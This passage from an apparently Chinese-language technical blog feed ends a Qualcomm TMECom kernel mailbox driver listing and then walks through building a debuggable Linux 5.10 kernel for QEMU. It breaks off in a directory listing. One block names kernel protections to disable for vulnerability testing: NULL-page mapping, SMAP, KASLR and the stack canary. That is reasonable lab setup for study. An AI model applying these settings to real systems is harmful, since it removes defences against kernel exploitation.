class="hljs-keyword">return</span> len;<br>&#125;<br><br><span class="hljs-built_in">tmecom_process_request</span>(dpkt, len, dpkt, &amp;rxlen);<br><br><span class="hljs-built_in">print_hex_dump_bytes</span>(<span class="hljs-string">&quot;tmecom decoded bytes : &quot;</span>,<br>DUMP_PREFIX_ADDRESS, dpkt, rxlen);<br><br><span class="hljs-built_in">pr_debug</span>(<span class="hljs-string">&quot;calling TME_HWKM_CMD_BROADCAST_TP_KEY api\n&quot;</span>);<br>ret = <span class="hljs-built_in">tme_hwkm_master_broadcast_transportkey</span>(err_info);<br><br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br><span class="hljs-built_in">pr_debug</span>(<span class="hljs-string">&quot;%s successful\n&quot;</span>, __func__);<br><br><span class="hljs-keyword">return</span> len;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> tmecom_debugfs_ops = &#123;<br>.open = simple_open,<br>.write = tmecom_debugfs_write,<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_DEBUG_FS */</span></span><br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">tmecom_receive_message</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mbox_client *client, <span class="hljs-type">void</span> *message)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tmecom</span> *tdev = <span class="hljs-built_in">dev_get_drvdata</span>(client-&gt;dev);<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">qmp_pkt</span> *pkt = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (!message) &#123;<br><span class="hljs-built_in">dev_err</span>(tdev-&gt;dev, <span class="hljs-string">&quot;spurious message received\n&quot;</span>);<br><span class="hljs-keyword">goto</span> tmecom_receive_end;<br>&#125;<br><br><span class="hljs-keyword">if</span> (tdev-&gt;rx_done) &#123;<br><span class="hljs-built_in">dev_err</span>(tdev-&gt;dev, <span class="hljs-string">&quot;tmecom response pending\n&quot;</span>);<br><span class="hljs-keyword">goto</span> tmecom_receive_end;<br>&#125;<br>pkt = (<span class="hljs-keyword">struct</span> qmp_pkt *)message;<br>tdev-&gt;pkt.size = pkt-&gt;size;<br>tdev-&gt;pkt.data = pkt-&gt;data;<br>tdev-&gt;rx_done = <span class="hljs-literal">true</span>;<br>tmecom_receive_end:<br><span class="hljs-built_in">wake_up_interruptible</span>(&amp;tdev-&gt;waitq);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">tmecom_probe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> platform_device *pdev)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tmecom</span> *tdev;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *label;<br><span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br><br>tdev = <span class="hljs-built_in">devm_kzalloc</span>(&amp;pdev-&gt;dev, <span class="hljs-built_in">sizeof</span>(*tdev), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!tdev)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>tdev-&gt;cl.dev = &amp;pdev-&gt;dev;<br>tdev-&gt;cl.tx_block = <span class="hljs-literal">true</span>;<br>tdev-&gt;cl.tx_tout = <span class="hljs-number">500</span>;<br>tdev-&gt;cl.knows_txdone = <span class="hljs-literal">false</span>;<br>tdev-&gt;cl.rx_callback = tmecom_receive_message;<br><br>label = <span class="hljs-built_in">of_get_property</span>(pdev-&gt;dev.of_node, <span class="hljs-string">&quot;mbox-names&quot;</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!label)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-built_in">snprintf</span>(name, <span class="hljs-number">32</span>, <span class="hljs-string">&quot;%s_send_message&quot;</span>, label);<br><br>tdev-&gt;chan = <span class="hljs-built_in">mbox_request_channel</span>(&amp;tdev-&gt;cl, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR</span>(tdev-&gt;chan)) &#123;<br><span class="hljs-built_in">dev_err</span>(&amp;pdev-&gt;dev, <span class="hljs-string">&quot;failed to get mbox channel\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">PTR_ERR</span>(tdev-&gt;chan);<br>&#125;<br><br><span class="hljs-built_in">mutex_init</span>(&amp;tdev-&gt;lock);<br><br><span class="hljs-keyword">if</span> (tdev-&gt;chan) &#123;<br>tdev-&gt;txbuf =<br><span class="hljs-built_in">devm_kzalloc</span>(&amp;pdev-&gt;dev, MBOX_MAX_MSG_LEN, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!tdev-&gt;txbuf) &#123;<br><span class="hljs-built_in">dev_err</span>(&amp;pdev-&gt;dev, <span class="hljs-string">&quot;message buffer alloc faile\n&quot;</span>);<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br>&#125;<br><br><span class="hljs-built_in">init_waitqueue_head</span>(&amp;tdev-&gt;waitq);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DEBUG_FS)</span><br>debugfs_file = <span class="hljs-built_in">debugfs_create_file</span>(name, <span class="hljs-number">0220</span>, <span class="hljs-literal">NULL</span>, tdev,<br>&amp;tmecom_debugfs_ops);<br><span class="hljs-keyword">if</span> (!debugfs_file)<br><span class="hljs-keyword">goto</span> err;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_DEBUG_FS */</span></span><br><br>tdev-&gt;rx_done = <span class="hljs-literal">false</span>;<br>tdev-&gt;dev = &amp;pdev-&gt;dev;<br><span class="hljs-built_in">dev_set_drvdata</span>(&amp;pdev-&gt;dev, tdev);<br><br>tmedev = tdev;<br><br><span class="hljs-built_in">dev_info</span>(&amp;pdev-&gt;dev, <span class="hljs-string">&quot;tmecom probe success\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>err:<br><span class="hljs-built_in">mbox_free_channel</span>(tdev-&gt;chan);<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">tmecom_remove</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> platform_device *pdev)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tmecom</span> *tdev = <span class="hljs-built_in">platform_get_drvdata</span>(pdev);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DEBUG_FS)</span><br><span class="hljs-built_in">debugfs_remove</span>(debugfs_file);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_DEBUG_FS */</span></span><br><br><span class="hljs-keyword">if</span> (tdev-&gt;chan)<br><span class="hljs-built_in">mbox_free_channel</span>(tdev-&gt;chan);<br><br><span class="hljs-built_in">dev_info</span>(&amp;pdev-&gt;dev, <span class="hljs-string">&quot;tmecom remove success\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">of_device_id</span> tmecom_match_tbl[] = &#123;<br>&#123;.compatible = <span class="hljs-string">&quot;qcom,tmecom-qmp-client&quot;</span>&#125;,<br>&#123;&#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">platform_driver</span> tmecom_driver = &#123;<br>.probe = tmecom_probe,<br>.remove = tmecom_remove,<br>.driver = &#123;<br>.name = <span class="hljs-string">&quot;tmecom-qmp-client&quot;</span>,<br>.suppress_bind_attrs = <span class="hljs-literal">true</span>,<br>.of_match_table = tmecom_match_tbl,<br>&#125;,<br>&#125;;<br><span class="hljs-built_in">module_platform_driver</span>(tmecom_driver);<br><br><span class="hljs-built_in">MODULE_DESCRIPTION</span>(<span class="hljs-string">&quot;MSM TMECom QTI mailbox protocol client&quot;</span>);<br><span class="hljs-built_in">MODULE_LICENSE</span>(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux_Kernel编译调试env</title>
    <link href="/2024/04/07/20__Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env/"/>
    <url>/2024/04/07/20__Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env/</url>
    
    <content type="html"><![CDATA[<h2 id="运行主机环境"><a href="#运行主机环境" class="headerlink" title="运行主机环境"></a>运行主机环境</h2><p><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2010-38-12%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@uubb-ThinkCentre-M930s-N000:/# uname -a<br><span class="hljs-attribute">Linux</span> uubb-ThinkCentre-M930s-N000 <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">150</span>-generic #<span class="hljs-number">167</span>~<span class="hljs-number">18</span>.<span class="hljs-number">04</span>.<span class="hljs-number">1</span>-Ubuntu SMP Wed May <span class="hljs-number">24</span> <span class="hljs-number">00</span>:<span class="hljs-number">51</span>:<span class="hljs-number">42</span> UTC <span class="hljs-number">2023</span> x86_64 x86_64 x86_64 GNU/Linux<br><span class="hljs-attribute">root</span>@uubb-ThinkCentre-M930s-N000:/# nproc<br><span class="hljs-attribute">16</span><br></code></pre></td></tr></table></figure><h2 id="下载内核"><a href="#下载内核" class="headerlink" title="下载内核"></a>下载内核</h2><p>内核下载链接： <a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/">https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//mi</span>rrors.edge.kernel.org<span class="hljs-regexp">/pub/</span>linux<span class="hljs-regexp">/kernel/</span>v5.x/linux-<span class="hljs-number">5.10</span>.tar.gz<br>将压缩包放到自己指定的目录，解压<br>tar -zxf linux-<span class="hljs-number">5.10</span>.tar.gz<br></code></pre></td></tr></table></figure><h2 id="下载-qemu"><a href="#下载-qemu" class="headerlink" title="下载 qemu"></a>下载 qemu</h2><p>apt install qemu-system</p><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>清除以前的配置，回到默认配置</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift">uubb<span class="hljs-meta">@uubb</span><span class="hljs-operator">-</span><span class="hljs-type">ThinkCentre</span><span class="hljs-operator">-</span><span class="hljs-type">M930s</span><span class="hljs-operator">-</span><span class="hljs-type">N000</span> <span class="hljs-operator">~/</span>k<span class="hljs-operator">/</span>linux<span class="hljs-operator">-</span><span class="hljs-number">5.10</span><span class="hljs-operator">&gt;</span> sudo make mrproper<br>[sudo] uubb 的密码： <br><br>  <span class="hljs-type">CLEAN</span>   scripts<span class="hljs-operator">/</span>basic<br>  <span class="hljs-type">CLEAN</span>   scripts<span class="hljs-regexp">/gdb/</span>linux<br>  <span class="hljs-type">CLEAN</span>   scripts<span class="hljs-operator">/</span>kconfig<br>  <span class="hljs-type">CLEAN</span>   scripts<span class="hljs-operator">/</span>mod<br>  <span class="hljs-type">CLEAN</span>   scripts<span class="hljs-regexp">/selinux/</span>genheaders<br>  <span class="hljs-type">CLEAN</span>   scripts<span class="hljs-regexp">/selinux/</span>mdp<br>  <span class="hljs-type">CLEAN</span>   scripts<br>  <span class="hljs-type">CLEAN</span>   include<span class="hljs-regexp">/config include/</span>generated arch<span class="hljs-regexp">/x86/</span>include<span class="hljs-operator">/</span>generated .config .config.old .version <span class="hljs-type">Module</span>.symvers vmlinux<span class="hljs-operator">-</span>gdb.py<br></code></pre></td></tr></table></figure><p>生成.config 文件</p><blockquote><p>env ARCH&#x3D;X86_64 make deconfig<br>或者<br>make deconfig  &#x2F;&#x2F; 根据机器默认生成<br>上面两个都生成不了，最终执行<br>make x86_64_deconfig<br><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2014-42-17%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p></blockquote><p>修改配置信息<br>make memuconfig</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"># Debugging<br>K<span class="hljs-function"><span class="hljs-title">ernel</span> hacking ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">ompile</span>-<span class="hljs-built_in">time</span> checks <span class="hljs-built_in">and</span> compiler options ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">ompile</span> the kernel <span class="hljs-keyword">with</span> debug info ---&gt;</span> yes<br>K<span class="hljs-function"><span class="hljs-title">ernel</span> hacking ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">ompile</span>-<span class="hljs-built_in">time</span> checks <span class="hljs-built_in">and</span> compiler options ---&gt;</span> P<span class="hljs-function"><span class="hljs-title">rovide</span> GDB scripts <span class="hljs-keyword">for</span> kernel debugging ---&gt;</span> yes<br>G<span class="hljs-function"><span class="hljs-title">eneral</span> setup ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">onfigure</span> standard kernel features ---&gt;</span> yes<br>G<span class="hljs-function"><span class="hljs-title">eneral</span> setup ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">onfigure</span> standard kernel features ---&gt;</span> L<span class="hljs-function"><span class="hljs-title">oad</span> all symbols <span class="hljs-keyword">for</span> debugging/ksymoops ---&gt;</span> yes<br>G<span class="hljs-function"><span class="hljs-title">eneral</span> setup ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">onfigure</span> standard kernel features ---&gt;</span> I<span class="hljs-function"><span class="hljs-title">nclude</span> all symbols <span class="hljs-built_in">in</span> kallsyms ---&gt;</span> yes<br></code></pre></td></tr></table></figure><p><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2011-27-34%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><p>其他可选配置</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xl"># Only <span class="hljs-keyword">if</span> <span class="hljs-number">64</span> bits <span class="hljs-keyword">is</span> selected<br>B<span class="hljs-function"><span class="hljs-title">inary</span> Emulations ---&gt;</span> IA32 <span class="hljs-function"><span class="hljs-title">a</span>.out support ---&gt;</span> yes<br>B<span class="hljs-function"><span class="hljs-title">inary</span> Emulations ---&gt;</span> IA32 ABI <span class="hljs-function"><span class="hljs-title">for</span> 64-bit mode ---&gt;</span> yes<br><br># Make sure the following options are enabled:<br>G<span class="hljs-function"><span class="hljs-title">eneral</span> setup ---&gt;</span> I<span class="hljs-function"><span class="hljs-title">nitial</span> RAM filesystem <span class="hljs-built_in">and</span> RAM disk (initramfs/initrd) support ---&gt;</span> yes<br>G<span class="hljs-function"><span class="hljs-title">eneral</span> setup ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">onfigure</span> standard kernel features ---&gt;</span> M<span class="hljs-function"><span class="hljs-title">ultiple</span> users, groups <span class="hljs-built_in">and</span> capabilities support ---&gt;</span> yes<br>G<span class="hljs-function"><span class="hljs-title">eneral</span> setup ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">onfigure</span> standard kernel features ---&gt;</span> S<span class="hljs-function"><span class="hljs-title">ysfs</span> syscall support ---&gt;</span> yes<br>D<span class="hljs-function"><span class="hljs-title">evice</span> Drivers ---&gt;</span> G<span class="hljs-function"><span class="hljs-title">eneric</span> Driver Options ---&gt;</span> M<span class="hljs-function"><span class="hljs-title">aintain</span> a devtmpfs filesystem to mount <span class="hljs-built_in">at</span> /dev ---&gt;</span> yes<br>D<span class="hljs-function"><span class="hljs-title">evice</span> Drivers ---&gt;</span> G<span class="hljs-function"><span class="hljs-title">eneric</span> Driver Options ---&gt;</span> A<span class="hljs-function"><span class="hljs-title">utomount</span> devtmpfs <span class="hljs-built_in">at</span> /dev, after the kernel mounted the rootfs ---&gt;</span> yes<br>D<span class="hljs-function"><span class="hljs-title">evice</span> Drivers ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">haracter</span> devices ---&gt;</span> E<span class="hljs-function"><span class="hljs-title">nable</span> TTY ---&gt;</span> yes<br>D<span class="hljs-function"><span class="hljs-title">evice</span> Drivers ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">haracter</span> devices ---&gt;</span> S<span class="hljs-function"><span class="hljs-title">erial</span> drivers ---&gt;</span> <span class="hljs-number">8250</span>/<span class="hljs-number">16550</span> <span class="hljs-function"><span class="hljs-title">and</span> compatible serial support ---&gt;</span> yes<br>D<span class="hljs-function"><span class="hljs-title">evice</span> Drivers ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">haracter</span> devices ---&gt;</span> S<span class="hljs-function"><span class="hljs-title">erial</span> drivers ---&gt;</span> C<span class="hljs-function"><span class="hljs-title">onsole</span> on 8250/16550 <span class="hljs-built_in">and</span> compatible serial port ---&gt;</span> yes<br>F<span class="hljs-function"><span class="hljs-title">ile</span> systems ---&gt;</span> P<span class="hljs-function"><span class="hljs-title">seudo</span> filesystems ---&gt;</span> /<span class="hljs-function"><span class="hljs-title">proc</span> file system support ---&gt;</span> yes<br>F<span class="hljs-function"><span class="hljs-title">ile</span> systems ---&gt;</span> P<span class="hljs-function"><span class="hljs-title">seudo</span> filesystems ---&gt;</span> <span class="hljs-function"><span class="hljs-title">sysfs</span> file system support ---&gt;</span> yes<br></code></pre></td></tr></table></figure><p>如果想要在此内核上测试漏洞或内容，需要禁用以下策略：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># Allocations at NULL to allow nullptr de-reference</span><br>Memory Management options ---&gt; Low address space <span class="hljs-keyword">to</span> protect <span class="hljs-keyword">from</span> user allocation ---&gt; <span class="hljs-number">0</span><br><span class="hljs-comment"># SMAP disabled</span><br>Processor type <span class="hljs-keyword">and</span> features ---&gt; Supervisor Mode Access Prevention ---&gt; <span class="hljs-literal">no</span><br><span class="hljs-comment"># KASL, can be disabled by setting nokaslr in the bootloader cmdline</span><br>Processor type <span class="hljs-keyword">and</span> features ---&gt; Build a relocatable kernel ---&gt; <span class="hljs-literal">no</span><br><span class="hljs-comment"># Canary disabled</span><br>General architecture-dependent options ---&gt; Stack Protector buffer overflow detection ---&gt; <span class="hljs-literal">no</span><br></code></pre></td></tr></table></figure><p>开始编译</p><p>make -j 16</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">uubb@uubb-ThinkCentre-M930s-N000 ~/k/linux-5.10&gt; <span class="hljs-built_in">env</span> ARCH=x86_64 make -j16<br>  SYSTBL  <span class="hljs-built_in">arch</span>/x86/include/generated/asm/syscalls_32.h<br>  SYSHDR  <span class="hljs-built_in">arch</span>/x86/include/generated/asm/unistd_32_ia32.h<br>  SYSHDR  <span class="hljs-built_in">arch</span>/x86/include/generated/asm/unistd_64_x32.h<br>  SYSTBL  <span class="hljs-built_in">arch</span>/x86/include/generated/asm/syscalls_64.h<br>  SYSHDR  <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/unistd_32.h<br>  SYSHDR  <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/unistd_64.h<br>  SYSHDR  <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/unistd_x32.h<br>  WRAP    <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/bpf_perf_event.h<br>  WRAP    <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/errno.h<br>  WRAP    <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/fcntl.h<br>  WRAP    <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/ioctl.h<br>  WRAP    <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/ioctls.h<br>  WRAP    <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/ipcbuf.h<br>  WRAP    <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/param.h<br>  WRAP    <span class="hljs-built_in">arch</span>/x86/include/generated/uapi/asm/poll.h<br>...<br>  LD [M]  fs/efivarfs/efivarfs.ko<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/video-bios.o<br>  HOSTCC  <span class="hljs-built_in">arch</span>/x86/boot/tools/build<br>  HOSTCC  <span class="hljs-built_in">arch</span>/x86/boot/compressed/mkpiggy<br>  LD [M]  net/netfilter/nf_log_common.ko<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/compressed/cpuflags.o<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/compressed/early_serial_console.o<br>  CPUSTR  <span class="hljs-built_in">arch</span>/x86/boot/cpustr.h<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/compressed/kaslr.o<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/compressed/ident_map_64.o<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/compressed/idt_64.o<br>  LD [M]  net/netfilter/xt_MASQUERADE.ko<br>  AS      <span class="hljs-built_in">arch</span>/x86/boot/compressed/idt_handlers_64.o<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/cpu.o<br>  AS      <span class="hljs-built_in">arch</span>/x86/boot/compressed/mem_encrypt.o<br>  LD [M]  net/netfilter/xt_addrtype.ko<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/compressed/pgtable_64.o<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/compressed/acpi.o<br>  AS      <span class="hljs-built_in">arch</span>/x86/boot/compressed/efi_thunk_64.o<br>  LD [M]  net/netfilter/xt_LOG.ko<br>  LD [M]  net/netfilter/xt_mark.ko<br>  LD [M]  net/netfilter/xt_nat.ko<br>  CC      <span class="hljs-built_in">arch</span>/x86/boot/compressed/misc.o<br>  GZIP    <span class="hljs-built_in">arch</span>/x86/boot/compressed/vmlinux.bin.gz<br>  MKPIGGY <span class="hljs-built_in">arch</span>/x86/boot/compressed/piggy.S<br>  AS      <span class="hljs-built_in">arch</span>/x86/boot/compressed/piggy.o<br>  LD      <span class="hljs-built_in">arch</span>/x86/boot/compressed/vmlinux<br>  ZOFFSET <span class="hljs-built_in">arch</span>/x86/boot/zoffset.h<br>  OBJCOPY <span class="hljs-built_in">arch</span>/x86/boot/vmlinux.bin<br>  AS      <span class="hljs-built_in">arch</span>/x86/boot/header.o<br>  LD      <span class="hljs-built_in">arch</span>/x86/boot/setup.elf<br>  OBJCOPY <span class="hljs-built_in">arch</span>/x86/boot/setup.bin<br>  BUILD   <span class="hljs-built_in">arch</span>/x86/boot/bzImage<br>Kernel: <span class="hljs-built_in">arch</span>/x86/boot/bzImage is ready  (<span class="hljs-comment">#1)</span><br></code></pre></td></tr></table></figure><p>看编译的日志信息，bzImage 显示在x86 文件内，在其实我指定了x86_64。在arch 目录内，会生成一个x86_64文件夹，并且有镜像。<br><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2014-51-44%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><p>编译后的目录</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs tap">uubb@uubb-ThinkCentre-M930s-N000 ~/k/linux-5.10&gt; ls -al<br>总用量 1708<br>drwxrwxr-x <span class="hljs-number"> 25 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:32 ./<br>drwxrwxr-x  <span class="hljs-number"> 3 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 16 </span>16:31 ../<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb         <span class="hljs-number"> 0 </span>1月 <span class="hljs-number"> 16 </span>18:04 1_readme_wuyou.txt<br>drwxrwxr-x <span class="hljs-number"> 26 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 arch/<br>drwxrwxr-x  <span class="hljs-number"> 3 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 block/<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb       <span class="hljs-number"> 423 </span>1月 <span class="hljs-number"> 16 </span>16:57 build_log.txt<br>drwxrwxr-x  <span class="hljs-number"> 2 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 certs/<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb     <span class="hljs-number"> 16673 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>.clang-format<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb        <span class="hljs-number"> 59 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>.cocciconfig<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb    <span class="hljs-number"> 248775 </span>1月 <span class="hljs-number"> 17 </span>11:32 .config<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb       <span class="hljs-number"> 496 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>COPYING<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb    <span class="hljs-number"> 100478 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>CREDITS<br>drwxrwxr-x  <span class="hljs-number"> 4 </span>uubb uubb     <span class="hljs-number"> 12288 </span>1月 <span class="hljs-number"> 17 </span>11:19 crypto/<br>drwxr-xr-x <span class="hljs-number"> 21 </span>root root      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 16 